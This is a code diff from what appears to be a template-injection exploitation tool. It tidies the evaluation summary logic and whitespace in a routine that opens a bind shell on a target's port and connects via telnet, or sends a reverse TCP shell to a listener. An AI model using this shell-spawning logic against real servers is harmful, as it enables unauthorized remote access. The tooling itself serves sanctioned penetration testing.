@@ -30,16 +30,13 @@ def _print_injection_summary(channel):
     render = channel.data.get('render', '%(code)s').replace('\n', '\\n') % ({'code' : '*' })
     suffix = channel.data.get('suffix', '').replace('\n', '\\n')
 
-    idiom = channel.data.get('evaluate')
-    if idiom:
-        evaluation = 'yes, %s code' % (idiom)
-        if channel.data.get('evaluate_blind'):
-            evaluation += ' (blind)'
+    if channel.data.get('evaluate_blind'):
+        evaluation = 'yes (blind)'
+    elif channel.data.get('evaluate'):
+        evaluation = 'yes'
     else:
         evaluation = 'no'
 
-    # Handle execute_blind first since even if it's blind, execute is set as well
-    # TODO: fix this? less ambiguity
     if channel.data.get('execute_blind'):
         execution = 'yes (blind)'
     elif channel.data.get('execute'):
@@ -208,23 +205,23 @@ def check_template_injection(channel):
     if tcp_shell_port:
 
         if channel.data.get('tcp_shell'):
-            
+
             urlparsed = urlparse.urlparse(channel.base_url)
             if not urlparsed.hostname:
                 log.error("Error parsing hostname")
                 return
-                
+
             for idx, thread in enumerate(current_plugin.tcp_shell(tcp_shell_port)):
-                
+
                 log.info('Spawn a shell on remote port %i with payload %i' % (tcp_shell_port, idx+1))
-                
+
                 thread.join(timeout=1)
 
                 if not thread.isAlive():
                     continue
-                    
+
                 try:
-                    
+
                     telnetlib.Telnet(urlparsed.hostname, tcp_shell_port, timeout = 5).interact()
 
                     # If telnetlib does not rise an exception, we can assume that
@@ -252,13 +249,13 @@ def check_template_injection(channel):
         if channel.data.get('reverse_tcp_shell'):
 
             current_plugin.reverse_tcp_shell(host, port)
-                
+
             # Run tcp server
             try:
                 tcpserver = TcpServer(int(port), timeout)
             except socket.timeout as e:
                     log.error("No incoming TCP shells after %is, quitting." % (timeout))
-                
+
 
         else:
 
